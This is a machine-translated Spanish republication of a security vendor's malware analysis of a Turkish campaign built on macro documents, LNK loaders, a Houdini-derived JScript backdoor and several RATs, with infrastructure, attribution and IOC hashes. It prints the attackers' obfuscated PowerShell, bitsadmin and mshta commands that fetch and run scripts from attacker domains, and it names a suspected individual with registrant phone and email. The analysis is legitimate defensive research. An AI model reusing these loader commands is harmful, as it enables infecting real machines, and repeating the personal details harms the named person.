<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üòÇ ‚úçüèæ üôÜüèæ Trucos turcos con gusanos, ratas ... y un profesional independiente üõå üì¨ ‚õ∑Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Los especialistas del grupo de investigaci√≥n de amenazas del centro de seguridad de Tecnolog√≠as positivas (PT Expert Security Center) descubrieron una...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Trucos turcos con gusanos, ratas ... y un profesional independiente</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/479998/">  Los especialistas del grupo de investigaci√≥n de amenazas del <a href="https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/">centro de seguridad de Tecnolog√≠as positivas (PT Expert Security Center)</a> descubrieron una campa√±a maliciosa que ha estado activa desde al menos mediados de enero de 2018.  La operaci√≥n est√° dirigida a usuarios de Brasil, Reino Unido, Hungr√≠a, Alemania, Letonia, Estados Unidos, Turqu√≠a y Filipinas.  Se utiliza una variedad de herramientas y t√©cnicas para infectar y controlar la PC de la v√≠ctima.  Este informe detalla la etapa de infecci√≥n, las utilidades utilizadas, las caracter√≠sticas de organizaci√≥n de la infraestructura de red, as√≠ como las huellas digitales que nos llevaron a convertirnos en el hacker candidato. <br><br><h2>  Resumen </h2><br><ul><li>  Los atacantes procesaron el gusano hace 10 a√±os, teniendo en cuenta las t√©cnicas modernas </li><li>  El zool√≥gico de herramientas utilizadas en conjunto con una extensa infraestructura de red </li><li>  El principal sospechoso es un profesional independiente turco </li></ul><a name="habracut"></a><br><h2>  Entrega de carga √∫til </h2><br><h3>  Documentos de oficina </h3><br>  El 5 de abril de 2019, como parte del seguimiento de nuevas amenazas, los especialistas de PT Expert Security Center descubrieron un documento sospechoso de la oficina.  Archivo con la extensi√≥n .docm (documento de MS Word de una nueva muestra con soporte de macro): <br><br><ul><li>  creado unos d√≠as antes del descubrimiento (31-03-2019), </li><li>  contiene una imagen para convencer al usuario de habilitar macros, </li><li>  fue creado en un sistema con el idioma turco (esto se evidencia por los valores de los campos de metadatos: ‚ÄúKonu Ba≈ülƒ±ƒüƒ±‚Äù - ‚ÄúT√≠tulo del tema‚Äù, ‚ÄúKonu Ba l, 1‚Äù - ‚ÄúEncabezado de tema, 1‚Äù; traducci√≥n del Traductor de Google). </li></ul><br><img src="https://habrastorage.org/webt/vu/vp/fj/vuvpfjfs9iissnmjcse2lyndlmk.png"><br><br>  <i>Fig.</i>  <i>1. Trampa de notificaci√≥n de macro t√≠pica</i> <br><br>  El c√≥digo de macro est√° un poco ofuscado, pero es lac√≥nico: al usar el cmdlet Background Intelligent Transfer Management (BITS) para PowerShell, carga y ejecuta un script JScript desde un servidor atacante: <br><br><pre><code class="javascript hljs">Shell (<span class="hljs-string"><span class="hljs-string">"pow"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ershe"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"ll -comm"</span></span> &amp; <span class="hljs-string"><span class="hljs-string">"and "</span></span><span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb1.js;');Start-Process -WindowStyle hidden -FilePath 'cmd.exe' -ArgumentList '/c %systemroot%\system32\wscript %temp%\bb1.js'"</span></span><span class="hljs-string"><span class="hljs-string">""</span></span>)</code> </pre> <br>  El uso de PowerShell y un m√≥dulo at√≠pico para descargar archivos de un servidor web se debe a un intento de eludir las restricciones sobre el lanzamiento y la ejecuci√≥n de programas no confiables. <br><br>  Hay varios documentos similares.  Por ejemplo, uno de ellos es un archivo .doc (un documento antiguo de MS Word) con una p√°gina de c√≥digos de caracteres en turco.  El trabajo macro tambi√©n es muy similar: <br><br><pre> <code class="javascript hljs">Shell <span class="hljs-string"><span class="hljs-string">"cmd.exe /c bitsadmin /transfer myjob /download /priority FOREGROUND https://definebilimi.com/up3e.js %temp%\o2.js &amp; wscript.exe %temp%\o2.js"</span></span>, vbHide</code> </pre> <br>  En este caso, el autor utiliza la misma tecnolog√≠a BITS, pero con la ayuda de la utilidad leg√≠tima del sistema bitsadmin.  Curiosamente, tanto la fecha en que se cre√≥ el documento como la hora en que se descubri√≥ en fuentes p√∫blicas nos env√≠an a mediados de julio de 2018.  Por lo tanto, los ataques son relevantes durante al menos aproximadamente un a√±o.  Adem√°s, se utiliza el mismo servidor atacante para descargar la carga √∫til;  El enfoque para nombrar un script cargable en JScript es similar. <br><br>  Otro documento tiene la extensi√≥n .rtf (formato de texto enriquecido).  Contiene varios documentos .xls (documento antiguo de MS Excel) con el mismo contenido.  El c√≥digo macro es completamente id√©ntico al extra√≠do del documento original, y la coincidencia de los valores de la p√°gina de c√≥digos y el campo XML HeadingPairs conducen a la misma autor√≠a. <br><br><h3>  Atajos de LNK </h3><br>  Vale la pena se√±alar que en esta campa√±a, no solo se usaron documentos de oficina como la etapa inicial de la infecci√≥n.  Conocimos un par de archivos .lnk maliciosos (Windows Shell Link) que, cuando se iniciaron, ejecutaban el siguiente comando: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /c powershell -command <span class="hljs-string"><span class="hljs-string">"$h1='e';&amp;('i' + $h1 + 'x')('Import-Module BitsTransfer;Start-BitsTransf' + $h1 + 'r https://definebilimi.com/1/b12.js $env:t' + $h1 + 'mp\bb.js;')"</span></span> &amp; %systemroot%\system32\wscript %temp%\bb.js</code> </pre> <br>  Las etiquetas se distribuyeron a mediados de marzo y finales de abril de 2019. <br><br>  Los metadatos de acceso directo contienen el nombre de usuario win7-bilgisayar (del turco "win7-computer"), el usuario del sistema en el que se crearon. <br><br>  Podemos suponer con seguridad que los correos electr√≥nicos de phishing son el escenario m√°s probable para entregar archivos maliciosos en la primera etapa de la infecci√≥n. <br><br><h2>  Metamorfosis de Houdini </h2><br>  Todos los objetos examinados de la primera etapa de la infecci√≥n descargan y ejecutan el mismo script en JScript (sin tener en cuenta las diferencias menores).  El archivo no est√° ofuscado ni empaquetado, y lo √∫nico que se ha hecho para complicar el an√°lisis son los nombres de variables aleatorias.  Es una puerta trasera en la plataforma WSH.  De las caracter√≠sticas de su trabajo, se pueden distinguir las siguientes: <br><br><ul><li>  La direcci√≥n de host y el puerto del servidor de administraci√≥n est√°n protegidos en un script </li><li>  La interacci√≥n con C&amp;C se lleva a cabo mediante solicitudes POST del protocolo HTTP. </li><li>  En el momento del comienzo del trabajo, la cadena "is-bekle" se inserta en el campo URI, traducido del turco como "is-ready". </li><li>  El campo User-Agent contiene informaci√≥n breve sobre el sistema con el delimitador especificado (en este caso, "&lt;|&gt;"): <br><ul><li>  El n√∫mero de serie del disco duro. </li><li>  nombre de usuario </li><li>  versi√≥n del sistema </li><li>  nombre del guion </li><li>  nombre antivirus </li><li>  valor de la variable de entorno% ProgramData%, </li><li>  la presencia de .Net FrameWork 4.5.2 en el sistema, </li><li>  tiempo de espera entre solicitudes, </li><li>  Java en el sistema. </li></ul><br></li><li>  <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Kotler-The-Adventures-Of-Av-And-The-Leaky-Sandbox-wp.pdf">Comprueba el</a> entorno para el tema del entorno limitado de Kaspersky Lab por el n√∫mero de serie dado del disco duro.  En caso de coincidencia, deja de funcionar. </li><li>  Recibe del servidor y ejecuta los comandos dados;  Aqu√≠ hay algunos de ellos: <br><ul><li>  descargando un archivo del servidor, </li><li>  subir archivo al servidor </li><li>  recolectando contenido del portapapeles, </li><li>  colecci√≥n de contenidos del cat√°logo, </li><li>  recopilaci√≥n de informaci√≥n del proceso, </li><li>  ejecutar comandos en el int√©rprete cmd.exe, </li><li>  tomando y enviando una captura de pantalla, </li><li>  Recupere y env√≠e bases de datos de Chrome y Opera con contrase√±as. </li></ul><br></li></ul><br><img src="https://habrastorage.org/webt/ky/xj/ur/kyxjurbcxvvpazharap_hq6fh68.png"><br>  <i>Fig.</i>  <i>2. El comienzo del script cargado en JScript desde el servidor atacante</i> <br><br>  Por la presencia de comentarios, la estructura del c√≥digo, los nombres de los comandos utilizados y el formato para recopilar informaci√≥n sobre el sistema, se puede establecer un paralelismo con el conocido gusano VBS Houdini.  En 2013, nuestros colegas de FireEye proporcionaron un <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">an√°lisis</a> detallado <a href="https://www.fireeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html">de las</a> funciones de este troyano, el procesamiento de comandos y la recopilaci√≥n de informaci√≥n en la que ocurren de manera similar.  Parece que en nuestro caso el atacante tom√≥ como base el modelo del conocido gusano, reescribi√≥ las funciones no en VBScript, sino en JScript, y reemplaz√≥ algunas l√≠neas en ingl√©s por las turcas. <br><br><img src="https://habrastorage.org/webt/z4/52/2t/z4522tdmc-74q3wrlsz_op7tqki.png"><br><br>  <i>Fig.</i>  <i>3. Procesando comandos de puerta trasera JScript</i> <br><br>  Vale la pena se√±alar que, como marcador de los resultados de la ejecuci√≥n del comando, se utilizan cadenas que contienen la subcadena "Bcorp".  Tambi√©n est√° presente en el nombre del servidor de administraci√≥n ip1 [.] Bcorp.fun. <br><br><h3>  En un servidor atacante </h3><br>  Seg√∫n Shodan, al 30 de abril de 2019, un atacante aloj√≥ un servidor web basado en <a href="https://www.appserv.org/en/">AppServ</a> .  No parece que el servidor se haya configurado cuidadosamente: por ejemplo, la p√°gina phpinfo est√° disponible, lo que revela informaci√≥n de configuraci√≥n interesante.  Al analizar los enlaces web desde los que se descarg√≥ el malware, result√≥ que el servidor ten√≠a un directorio abierto (directorio ./a) que enumeraba las herramientas de otros atacantes. <br><br><img src="https://habrastorage.org/webt/ti/rg/ms/tirgmslrqtgw3epiumyzv0yrag0.png"><br><br>  <i>Fig.</i>  <i>4. P√°gina de inicio del servidor atacante</i> <br><br><img src="https://habrastorage.org/webt/cq/-d/g1/cq-dg1v3yxrbqgprtstzphvyogm.png"><br><br>  <i>Fig.</i>  <i>5. p√°gina phpinfo en el servidor atacante</i> <br><br><img src="https://habrastorage.org/webt/xc/cy/hj/xccyhjiblf6w1xkmzj51prgol-0.png"><br><br>  <i>Fig.</i>  <i>6. Listado del directorio abierto del servidor atacante a finales de abril de 2019</i> <br><br><img src="https://habrastorage.org/webt/ji/zs/r0/jizsr0d3hrbqout2mrth5hfq794.png"><br><br>  <i>Fig.</i>  <i>7. Listado del directorio abierto del servidor atacante a finales de mayo de 2019</i> <br><br>  A continuaci√≥n se muestra una descripci√≥n de los archivos detectados. <br><br><h3>  Houdini jscript </h3><br>  En primer lugar, recibimos muchas variaciones del gusano Houdini modificado, discutido anteriormente.  De versi√≥n en versi√≥n, el script experiment√≥ cambios menores: nombres de host (husan2.ddns.net, ip1.bcorp.fun, ip1.qqww.eu), puertos (86, 87), nombres de variables, comandos individuales aparecieron o desaparecieron.  Una versi√≥n incluso se enmarc√≥ como un scriptlet en JScript. <br><br><img src="https://habrastorage.org/webt/vp/7v/se/vp7vsedyr71hixfb31ffenjzdg4.png"><br><br>  <i>Fig.</i>  <i>8. Houdini JScript como scriptlet</i> <br><br><h3>  Frasco Bcorp </h3><br>  Puerta trasera de Java ligera hecha a s√≠ misma.  Interact√∫a con C&amp;C sobre TCP en el puerto 22122. Puede: <br><br><ul><li>  ejecutar comandos en el int√©rprete cmd.exe, </li><li>  determinar la versi√≥n del sistema </li><li>  Listar directorios </li><li>  subir archivos </li><li>  registrarse en el directorio de inicio y la rama de inicio de registro. </li></ul><br>  Parece que esto es exactamente por qu√© el gusano modificado busca Java en el sistema.  Al mismo tiempo, no est√° claro por qu√© usar una puerta trasera adicional, porque la original tiene un conjunto suficiente de funciones. <br><br><h3>  Get-chromecreds </h3><br>  <a href="https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/DumpCreds/PS">Contenedor PowerShell</a> para extraer el historial, inicios de sesi√≥n, contrase√±as y cookies del navegador Chrome.  Algunas versiones contienen una biblioteca auxiliar System.Data.SQLite.dll para sistemas x86 y x64 en forma codificada en base64, mientras que otras asumen su presencia en el directorio% APPDATA%.  El componente viene como un complemento auxiliar para la puerta trasera principal de JScript. <br><br><h3>  Start-keylogger </h3><br>  <a href="">Implementaci√≥n de PowerShell de un</a> simple keylogger.  El componente viene como un complemento auxiliar para la puerta trasera principal de JScript. <br><br><img src="https://habrastorage.org/webt/lv/z9/hu/lvz9huoub4btquoi2gbiwd8ipsg.png"><br><br>  <i>Fig.</i>  <i>9. Fragmento de c√≥digo de PowerShell Keylogger</i> <br><br><h3>  WebBrowserPassView </h3><br>  <a href="https://www.nirsoft.net/utils/web_browser_password.html">Una utilidad</a> de Nirsoft para obtener inicios de sesi√≥n y contrase√±as de navegadores populares.  Los atacantes utilizaron la versi√≥n del autor, ya que la hab√≠an empaquetado previamente con ASPack para complicar el an√°lisis o evitar la detecci√≥n mediante indicadores. <br><br><h3>  NetWire RAT </h3><br>  Una <a href="https://ultrahacks.org/shop/product/netwire-rat/">herramienta</a> comercial disponible p√∫blicamente para el control remoto de PC.  Usado por varios grupos cibercriminales.  Los desarrolladores de malware complicaron el an√°lisis y el descubrimiento al empaquetar RAT en PE en la plataforma .NET y usar el ofuscador de c√≥digo DeepSea 4.1. <br><br><h3>  TCP Escuchar </h3><br>  Una sencilla <a href="https://www.allscoop.com/tcp-listen.php">utilidad GUI</a> de AllScoop para probar los par√°metros de un enrutador o firewall.  Cada puerto de escucha responde con una cadena dada, terminando la conexi√≥n. <br><br><img src="https://habrastorage.org/webt/ud/cr/k-/udcrk-bohjearwqg5thpcia9-ym.png"><br><br>  <i>Fig.</i>  <i>10. GUI de la utilidad de escucha TCP</i> <br><br><h3>  Cargador de Lnk </h3><br>  Cargador de accesos directos, similar a los ya considerados anteriormente.  Al inicio, ejecuta el siguiente comando: <br><br><pre> <code class="javascript hljs">C:\Windows\System32\cmd.exe /v /c <span class="hljs-string"><span class="hljs-string">"set i=h&amp;&amp;ms!i!ta http://ip1.qqww.eu/1/f.htm"</span></span></code> </pre> <br>  Esta vez, el acceso directo se cre√≥ con otro usuario (desktop-amkd3n3). <br><br><h3>  Cargadores de guiones </h3><br>  En este grupo hemos combinado los diversos gestores de arranque de la RAT anterior.  Todos ellos son de tama√±o peque√±o (hasta 1 KB), en varios formatos (.htm, .xsl, .hta, etc.), el c√≥digo se ejecuta en varios lenguajes de secuencias de comandos (JScript, PowerShell) y se compila sobre la marcha C #.  A continuaci√≥n se presentan fragmentos de c√≥digo de algunos ejemplos: <br><br><img src="https://habrastorage.org/webt/ga/dk/mj/gadkmjw2x2s7i9br6wvigjbduho.png"><br><br>  <i>Fig.</i>  <i>11. Fragmento del cargador .htm</i> <br><br><img src="https://habrastorage.org/webt/ta/du/fk/tadufk1tskw_mu33lyhp9o2uieg.png"><br><br>  <i>Fig.</i>  <i>12. Fragmento del gestor de arranque .xsl</i> <br><br><img src="https://habrastorage.org/webt/5o/qi/nn/5oqinngzwzjeqgcg_pvv1c7vsgo.png"><br><br>  <i>Fig.</i>  <i>13. Fragmento del gestor de arranque .ps1</i> <br><br><h3>  Minicargadores de pe </h3><br>  Adem√°s de los cargadores de scripts, se descubrieron archivos PE en la plataforma .NET.  Tambi√©n son peque√±os (hasta 10 KB), con funcionalidades similares: <br><br><img src="https://habrastorage.org/webt/gi/vo/lc/givolcsz3joqwnt0zqtq8ftqzui.png"><br><br>  <i>Fig.</i>  <i>14. Un ejemplo de c√≥digo descompilado de uno de los cargadores de PE</i> <br><br><h3>  xRAT </h3><br>  Un <a href="https://github.com/c4bbage/xRAT">proyecto de</a> distribuci√≥n p√∫blica y de libre distribuci√≥n para la gesti√≥n remota de PC.  Varias versiones y modificaciones est√°n muy extendidas.  Escrito en C #, parcialmente ofuscado. <br><br><h3>  Panel Bcorp vs.  constructor </h3><br>  La parte del servidor de control para la puerta trasera JScript.  Al mismo tiempo, es el dise√±ador de la parte del cliente.  Representa PE en la plataforma .NET.  No ofuscado, no empaquetado.  La interfaz se asemeja a una parte del servidor redise√±ada para el gusano VBS ya mencionado Houdini.  Adem√°s de enviar comandos, descarga componentes y complementos adicionales descritos anteriormente en la m√°quina infectada: entorno Java, scripts de PowerShell y una utilidad de Nirsoft para recopilar informaci√≥n de los navegadores, scripts de PowerShell para interceptar pulsaciones de teclas, etc. Es curioso que el proyecto se llame BcorpRat , que se puede ver en el t√≠tulo de la ventana en las im√°genes a continuaci√≥n.  Y en el nombre del espacio de nombres del c√≥digo fuente est√° la l√≠nea "Btech", a la que volveremos m√°s adelante. <br><br><img src="https://habrastorage.org/webt/m3/ix/63/m3ix63sjf1-fe3rawasy_jmhldk.png"><br><br>  <i>Fig.</i>  <i>15. Panel de control de puerta trasera JScript, ventana principal</i> <br><br><img src="https://habrastorage.org/webt/ob/qq/8g/obqq8gb4arhzlfjowoxato5v3yu.png"><br><br>  <i>Fig.</i>  <i>16. El panel de control JScript-backdoor, la ventana del dise√±ador de la parte del cliente</i> <br><br><h2>  Infraestructura de red </h2><br>  A continuaci√≥n, realizaremos un an√°lisis m√°s detallado de las direcciones con las que interactuaron estos u otros programas maliciosos del atacante.  Comencemos con el dominio definebilimi.com, al que acceden los documentos de Office y los cargadores de accesos directos. <br><br><h3>  definebilimi.com </h3><br>  El 16 de enero de 2018, este dominio tiene un nuevo propietario.  Por cierto, "definir bilimi" se traduce literalmente del turco como "un tesoro de la ciencia".  A continuaci√≥n se muestran los datos m√°s interesantes del historial de registros de WHOIS en ese momento. <br>  Tabla 1. Informaci√≥n sobre el registrante (propietario) del dominio definebilimi.com <br><br><div class="scrollable-table"><table><tbody><tr><th>  Nombre del registro </th><th>  Valor de registro </th></tr><tr><td>  Nombre del registrante </td><td>  Koray Yaman </td></tr><tr><td>  Calle registrante </td><td>  123456 </td></tr><tr><td>  Ciudad registrante </td><td>  Estambul </td></tr><tr><td>  Pa√≠s de registro </td><td>  TR </td></tr><tr><td>  Tel√©fono registrado </td><td>  +90.5350167352 </td></tr><tr><td>  Correo electr√≥nico del registrante </td><td>  btech@hotmail.com.tr </td></tr></tbody></table></div><br>  Ser√° imprudente afirmar que los datos son genuinos.  El pa√≠s indicado y la frecuencia de aparici√≥n de trazas de la lengua turca en el c√≥digo nos permiten suponer que estas coincidencias no son accidentales.  Y la direcci√≥n de correo electr√≥nico contiene la subcadena "btech", a la que ya hemos prestado atenci√≥n. <br><br>  El historial de cambios en los servidores NS que proporcionaron informaci√≥n sobre el dominio registrado parece interesante: <br><br><div class="scrollable-table"><table><tbody><tr><th>  Fecha </th><th>  Acci√≥n </th><th>  Servidor </th></tr><tr><td>  17/03/2018 </td><td>  Nueva entrada </td><td>  buhar.biz </td></tr><tr><td>  15/01/2019 </td><td>  Cambio de registro </td><td>  definebilimi.com </td></tr><tr><td>  06/04/2019 </td><td>  Cambio de registro </td><td>  qqww.eu </td></tr></tbody></table></div><br>  <i>Tabla 2. Historial de servidores NS para el dominio definebilimi.com</i> <br><br>  Los hosts buhar.biz y qqww.eu ya se han encontrado en malware anteriormente. <br><br><h3>  buhar.us </h3><br>  La nueva historia de este dominio ("buhar" del turco - "parejas") comienza el mismo d√≠a que la historia de definebilimi.com - 16 de enero de 2018. <br><br><div class="scrollable-table"><table><tbody><tr><th>  Nombre del registro </th><th>  Valor de registro </th></tr><tr><td>  Nombre del registrante </td><td>  balta zar </td></tr><tr><td>  Organizaci√≥n registrada </td><td>  Buharus </td></tr><tr><td>  Calle registrante </td><td>  Gizli </td></tr><tr><td>  Ciudad registrante </td><td>  Gizli </td></tr><tr><td>  Pa√≠s de registro </td><td>  TR </td></tr><tr><td>  Tel√©fono registrado </td><td>  +1.123456789 </td></tr><tr><td>  Correo electr√≥nico del registrante </td><td>  buharcin@yandex.com </td></tr></tbody></table></div><br>  <i>Tabla 3. Informaci√≥n sobre el registrante (propietario) del dominio buhar.us</i> <br><br>  La situaci√≥n es similar: nuevamente, algunos de los datos parecen falsos, excepto la direcci√≥n postal ("buharcin" del turco - "locomotora"). <br><br><h3>  bcorp.fun </h3><br>  El dominio se ha registrado desde el 23 de marzo de 2019.  Adem√°s del hecho de que Turqu√≠a est√° nuevamente registrada como pa√≠s, Bcorp figura como organizaci√≥n cliente.  En realidad, vemos lo mismo en el nombre de dominio en s√≠, como en varios p√°rrafos anteriores. <br><br><h3>  husan2.ddns.net </h3><br>  Es curioso que el atacante adquiera hosts no solo de la manera cl√°sica.  Desde mediados de marzo de 2019, se ha registrado el uso de los llamados servidores DNS din√°micos.  La tecnolog√≠a permite a los atacantes ocultar de manera efectiva sus direcciones IP y garantizar la vitalidad de sus centros de control.  Vale la pena se√±alar cierta previsibilidad en la elecci√≥n de los nombres: por ejemplo, despu√©s de un par de meses, se descubri√≥ el uso del dominio husan3.ddns.net, pero la actividad del dominio husan.ddns.net se remonta a abril de 2017. <br><br><h3>  bkorp.xyz </h3><br>  Desde principios de abril, el hacker, que contin√∫a avanzando por el camino del anonimato, registra dominios utilizando el servicio WhoisGuard, Inc., ubicado en Panam√°;  bkorp.xyz, prntsrcn.com e i37-imgur.com son solo algunos ejemplos.  Los servidores NS utilizados todav√≠a los vinculan a otros dominios maliciosos. <br><br><h3>  qqww.eu </h3><br>  Adem√°s del hecho de que este dominio, como el dominio bcorp.fun, tiene un subdominio ip1, hay otro detalle importante.  La informaci√≥n sobre el solicitante de registro indica la organizaci√≥n Osbil Technology Ltd., supuestamente ubicada en Berl√≠n.  De hecho, la organizaci√≥n del mismo nombre se encuentra en la costa de Chipre en la ciudad de Famagusta, en el territorio de la Rep√∫blica turca parcialmente reconocida del norte de Chipre.  Y el sitio <a href="https://www.yoncu.com/">web</a> oficial <a href="https://www.yoncu.com/">de la</a> compa√±√≠a se encuentra en el dominio, que fue el servidor NS del dominio bcorp.fun de marzo a mayo de 2019.  No encontramos signos de compromiso del servidor de nombres, y las caracter√≠sticas de infraestructura del proveedor NS (reemplazando al cliente con los datos del proveedor en la columna de registrante) hicieron posible ocultar la informaci√≥n del cliente del acceso p√∫blico. <br><br><img src="https://habrastorage.org/webt/7s/zz/q2/7szzq2mjgkuppmdvnpd_xdrk41c.png"><br><br>  <i>Fig.</i>  <i>17. Informaci√≥n sobre el registrante (propietario) del dominio qqww.eu</i> <br><br><h3>  Direcciones IP </h3><br>  Para completar, a continuaci√≥n se encuentran las direcciones IP, con algunos dominios correspondientes a diferentes intervalos de tiempo: <br><ul><li>  5.255.63.12 <br><ul><li>  bcorp.fun </li><li>  husan.ddns.net </li><li>  husan2.ddns.net </li><li>  husan3.ddns.net </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.137 <br><ul><li>  bcorp.fun </li><li>  bkorp.xyz </li><li>  definebilimi.com </li><li>  i36-imgur.com </li><li>  i37-imgur.com </li><li>  i38-imgur.com </li><li>  i39-imgur.com </li><li>  prntsrcn.com </li><li>  qqww.eu </li></ul><br></li><li>  192.95.3.140 <br><ul><li>  bkorp.xyz </li><li>  buhar.us </li></ul><br><h2>  En la estela del hacker </h2><br>  Entre las herramientas maliciosas y auxiliares, se encontr√≥ una imagen curiosa en el servidor del atacante: <br><br><img src="https://habrastorage.org/webt/c9/pi/gf/c9pigfzw8s36wno_idj18gwv57u.png"><br><br>  <i>Fig.</i>  <i>18. La imagen en el directorio en el alojamiento del atacante</i> <br><br>  No redujimos la resoluci√≥n de la imagen, sino que la colocamos aqu√≠ en la forma en que estaba en el host. <br><br>  A pesar de la baja calidad de imagen, pudimos establecer que esta es una captura de pantalla de una p√°gina sobre una transacci√≥n completada con criptomoneda en el recurso blockr.io.  Esto no funcion√≥, por lo que intentamos encontrar todo lo relacionado con el nombre IMG_JPEG-0371e4dce3c8804f1543c3f0f309cc11.jpg con el que el pirata inform√°tico almacen√≥ la imagen.  Las huellas llevaron al resultado de <a href="https://www.hybrid-analysis.com/sample/9f1f04db605ba35a97c1a0554c1932f5848c9bb7a4cb915cde670b0bb26dc7b6%3FenvironmentId%3D100">procesar</a> en un analizador en l√≠nea alg√∫n archivo cuyo nombre coincid√≠a con el nombre de nuestra imagen.  El objeto procesado es un acceso directo de Windows, similar a los que ya examinamos anteriormente.  Se le adjunt√≥ una foto con una fotograf√≠a de la tarjeta de identificaci√≥n de un ciudadano turco, cuyo apellido coincide con el apellido que se indic√≥ al registrar el dominio: Yaman. <br><br><img src="https://habrastorage.org/webt/pr/b7/ca/prb7cacgvurge0qqdt3tqnbthxe.png"><br><br>  <i>Fig.</i>  <i>19. Tarjeta de identificaci√≥n con gestor de arranque</i> <br><br>  El procesamiento del acceso directo en el entorno limitado en l√≠nea no se produjo como resultado de que el usuario descargara el archivo, sino que transmiti√≥ la URL desde la que era necesario descargar y procesar el objeto: <br><br> <code>hxxps://github.com/btechim/prntsrcn/blob/nm46ny/IMG-0371e4dce3c8804f1543c3f0f309cc11.jpg.lnk?raw=true</code> <br> <br>  La cuenta github del usuario ya est√° bloqueada, sin embargo, mediante el enlace podemos establecer el apodo del usuario (btechim) y el nombre del proyecto (prntsrcn).  El nombre del proyecto coincide con el nombre de uno de los dominios encontrados en la campa√±a (prntsrcn.com), y el apodo del usuario contiene la subcadena btech, que aparece en el c√≥digo del programa de los paneles de administraci√≥n mencionados anteriormente. <br><br>  La b√∫squeda del apodo de un usuario nos llev√≥ a un recurso independiente en el que se encuentra la <a href="https://www.freelancer.com/u/btechim">p√°gina</a> de un usuario de Turqu√≠a, con el mismo apodo, con un n√∫mero de tel√©fono confirmado, una direcci√≥n postal y un perfil de Facebook, que ofrece sus servicios en el desarrollo de software en el campo de la ciberseguridad. <br><br><img src="https://habrastorage.org/webt/cf/f2/y0/cff2y0moihsk3fy6abo_wu2489c.png"><br><br>  <i>Fig.</i>  <i>20. La p√°gina del presunto atacante en el recurso para aut√≥nomos</i> <br><br><h2>  Conclusiones </h2><br>  Durante varios meses, los expertos de Positive Technologies monitorearon el desarrollo de una campa√±a maliciosa de origen turco y transfirieron los datos acumulados a CERT Turqu√≠a.  No es frecuente que durante una serie de ataques se combine el uso de t√©cnicas modernas y herramientas recicladas hace 10 a√±os.  El atacante us√≥ una variedad de herramientas (por prop√≥sito, por plataforma, por nivel de dificultad) para obtener un control completo sobre la PC objetivo.  Vale la pena se√±alar la variabilidad de los enfoques en la preparaci√≥n de la infraestructura de red en los intentos de ocultar su identidad.  Sin embargo, una vez m√°s, no se tuvo en cuenta todo, la arrogancia y el infractor emitieron varias omisiones.  El estudio fue remitido al Centro turco de respuesta a incidentes de seguridad de la informaci√≥n. <br><br><div class="spoiler">  <b class="spoiler_title">COI</b> <div class="spoiler_text">  Cargadores de oficina: <br>  3305720da73efbcb7d25edbb7eff5a1a <br>  5b6d77f3e48e7723498ede5d5ba54f26 <br>  621a0133e28edec77a2d3e75115b8655 <br>  712e7ec49ad3b8c91b326b6d5ee8dcd8 <br>  731a3d72e3d36c2270c1d0711c73c301 <br>  929374b35a73c59fe97b336d0c414389 <br><br>  Cargadores LNK: <br>  3bc5d95e2bd2d52a300da9f3036f5b3b <br>  527069e966b4a854df35aef63f45986a <br>  a4667e0b3bfaca0cda5c344f1475b8e0 <br><br>  Houdini JScript: <br>  04c2ad67de2cea3f247cf50c5e12e969 <br>  5ab9176b9ed9f7a776ec82c412a89eab <br>  84f0d098880747f417703f251a2e0d1c <br>  94c6ba0d812b4daf214263fffc951a20 <br>  a52509a38846b55a524019f2f1a06ade <br>  bf2fb6cdbc9fde99e186f01ad26f959f <br>  c871091ce44594adbd6cf4388381e410 <br>  daf6a9eb55813d1a151695d33506179d <br>  f010af1b330d00abb5149e9defdae6ee <br>  ff924faeb9dfd7384c05abe855566fc9 <br><br>  Frasco Bcorp <br>  59978b5a9e4ab36da0f31a8f616cc9d3 <br>  a7219da3b0c0730c476fe340dbf7e4e5 <br>  ddac55213089da9ef407bce05ebe653e <br><br>  Get-chromecreds <br>  11769e9f49123a2af00bd74453221c07 <br>  1a81c9119d7761535c198ddb761979b8 <br>  42a85849a591e65b0254d9bcbdf59f82 <br>  8e49263f33c53ee5bc91bebbf9617352 <br>  c9ab090ad2badb9862fd5b6058428096 